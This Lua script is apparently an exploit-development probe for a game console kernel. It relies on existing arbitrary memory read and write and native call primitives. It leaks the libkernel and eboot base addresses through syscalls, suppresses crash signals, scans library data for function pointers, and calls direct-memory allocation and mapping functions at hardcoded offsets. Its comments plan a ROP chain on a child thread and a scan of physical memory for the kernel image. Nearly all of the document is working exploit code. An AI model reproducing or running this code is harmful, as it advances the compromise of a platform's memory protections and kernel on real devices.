-- CRASH_CLASS: HIGH
-- PROBE 531a: MapDirectMemory via child thread ROP chain
--
-- DEM9N101: libkernel+0x15020 = sceKernelMapNamedDirectMemory (7 args)
-- fcall only forwards 6 regs, leaving garbage 7th arg → crash.
-- Solution: thr_new child thread with full stack-based arg delivery.
--
-- Strategy:
-- 1. AllocateDirectMemory → get phys addr
-- 2. Build child ROP chain that calls MapDirectMemory with 7 args
-- 3. Read mapped VA from output pointer
-- 4. If it works: scan physical memory for kernel ELF header
--
-- Child ROP chain layout for a function call with 7 args:
-- The child starts at pop_rdi_ret, stack has all the setup.
-- We use sub_rsp gadget or direct stack layout for the 7th arg.
--
-- BUT: we don't have pop_r8/pop_r9 gadgets.
-- ALTERNATIVE: find a "mov r8, [rsp+X]; ..." gadget in eboot,
-- OR use the child thread's initial register state from thr_new.
--
-- thr_new(455) with thr_param: start_func gets arg in rdi.
-- If start_func = pop_rax_ret, then rdi = arg, rax = [rsp], rsp += 8
-- The child's initial RSP is set by us (stack_base + stack_size - 8).
--
-- For calling a FUNCTION (not syscall), we can do:
-- 1. Set up rdi,rsi,rdx,rcx via pop gadgets
-- 2. For r8,r9: use "xchg" or "mov" gadgets
-- 3. Put 7th arg on stack
-- 4. "call" the function (push ret addr + jmp, or just ret to it)
--
-- SIMPLEST approach: use a helper gadget that moves stack values
-- into r8/r9. Search eboot for such gadgets.
--
-- Or even simpler: write a tiny trampoline using mov [rdi],rax;ret
-- to store the result, and call the function with args on stack only.
--
-- Actually, the SIMPLEST: find sceKernelMapDirectMemory (6-arg version)
-- in libkernel. It should be near +0x15020.

print("=== PROBE 531a: MAPDM ROP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Get libkernel base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local lk_size = rd(N(ib) + 0x110) or 0
if lk_size < 0 then lk_size = lk_size + 0x100000000 end
print(string.format("lk=0x%X%08X+0x%X", lk_hi, lk_lo, lk_size))

-- Get eboot base
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eb_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eb=0x%X%08X", eb_hi, eb_lo))

-- ============================================================
-- [A] Search libkernel for the 6-arg MapDirectMemory
-- The 7-arg version is at +0x15020. The 6-arg one should be nearby.
-- Look for functions that call the 7-arg with name=NULL.
-- Scan libkernel .text around +0x15020 for xref patterns.
-- ============================================================
print("")
print("[A] libkernel around MapDirectMemory")

-- libkernel .text is XO — we CANNOT read it.
-- But we can scan the GOT/data section for wrapper addresses.
-- Use sys 649 to get libkernel data
local sc_649 = mk(649)
local lk_dt = memory.alloc(8)
pcall(function() sc_649(uint64(0x2001), uint64(3), uint64(lk_dt)) end)
local lk_data = rq(N(lk_dt))
print(string.format("  lk .data=%s", hexq(lk_data)))

-- Read first 1 KB of libkernel .data for function pointers
-- That we found before: AllocateDirectMemory is at GOT +0x17EF0
-- MapDirectMemory might have a GOT wrapper too
local lkdn = N(lk_data)
local lk_base_n = lk_hi * 0x100000000 + lk_lo
print("  scanning lk .data for text pointers...")
local lk_funcs = {}
for off = 0, 0x800 - 8, 8 do
    local v = rq(lkdn + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh < 0 then vh = vh + 0x100000000 end
        if vl < 0 then vl = vl + 0x100000000 end
        if vh == lk_hi and vl >= lk_lo and vl < lk_lo + lk_size then
            local text_off = vl - lk_lo
            table.insert(lk_funcs, {off = off, text_off = text_off})
            if text_off >= 0x14000 and text_off <= 0x18000 then
                print(string.format("  *** .data+0x%03X -> lk+0x%05X (near MapDM!)", off, text_off))
            end
        end
    end
end
print(string.format("  lk text ptrs in .data: %d", #lk_funcs))

-- ============================================================
-- [B] Try calling MapDirectMemory with fcall_with_rax
-- passing 0 as all args first (should return EINVAL, not crash)
-- ============================================================
print("")
print("[B] MapDirectMemory safe test")

local map_fn = lk_base + uint64(0x15020)

-- Test 1: all zeros — should return error but not crash
local out_ptr = memory.alloc(8)
wq(N(out_ptr), uint64(0))

local ok1, rv1 = pcall(function()
    return native.fcall_with_rax(map_fn, 0,
        uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
end)
print(string.format("  all_zero: ok=%s rv=%s", tostring(ok1), rv1 and hexq(rv1) or "nil"))

-- Test 2: out_ptr as arg1, rest 0 — might still crash if it dereferences arg7
local ok2, rv2 = pcall(function()
    return native.fcall_with_rax(map_fn, 0,
        uint64(N(out_ptr)), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
end)
print(string.format("  with_outptr: ok=%s rv=%s", tostring(ok2), rv2 and hexq(rv2) or "nil"))

-- ============================================================
-- [C] Try AllocateDirectMemory + MapDirectMemory with real args
-- If it's really 6-arg (not 7), fcall_with_rax should work
-- ============================================================
print("")
print("[C] Alloc + Map attempt")

local alloc_fn = lk_base + uint64(0x17EF0)

-- Allocate physical page
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
local ok_a, rv_a = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
local phys = rq(N(phys_out))
print(string.format("  alloc: ok=%s rv=%s phys=%s", tostring(ok_a),
    rv_a and hexq(rv_a) or "nil", hexq(phys)))

if phys and N(phys) ~= 0 then
    local ph, pl = get_hi_lo(phys)
    if ph < 0 then ph = ph + 0x100000000 end
    if pl < 0 then pl = pl + 0x100000000 end

    -- Try MapDirectMemory:
    -- (void **addr, size_t len, int prot, int flags, off_t start, size_t size)
    -- If 6-arg: addr=out_ptr, len=0x4000, prot=3(RW), flags=0, start=phys, size=0x4000
    wq(N(out_ptr), uint64(0))

    local ok_map, rv_map = pcall(function()
        return native.fcall_with_rax(map_fn, 0,
            uint64(N(out_ptr)), uint64(0x4000), uint64(3),
            uint64(0), uint64(string.format("0x%X%08X", ph, pl)), uint64(0x4000))
    end)
    print(string.format("  map: ok=%s rv=%s", tostring(ok_map), rv_map and hexq(rv_map) or "nil"))

    local mapped_va = rq(N(out_ptr))
    print(string.format("  mapped_va=%s", hexq(mapped_va)))

    if mapped_va and N(mapped_va) ~= 0 then
        -- Read from mapped physical memory!
        local d0 = rd(N(mapped_va))
        if d0 then
            if d0 < 0 then d0 = d0 + 0x100000000 end
            print(string.format("  mapped[0]=0x%08X", d0))
        else
            print("  mapped[0]=FAULT")
        end
    end
end

print("")
print("=== 531a DONE ===")
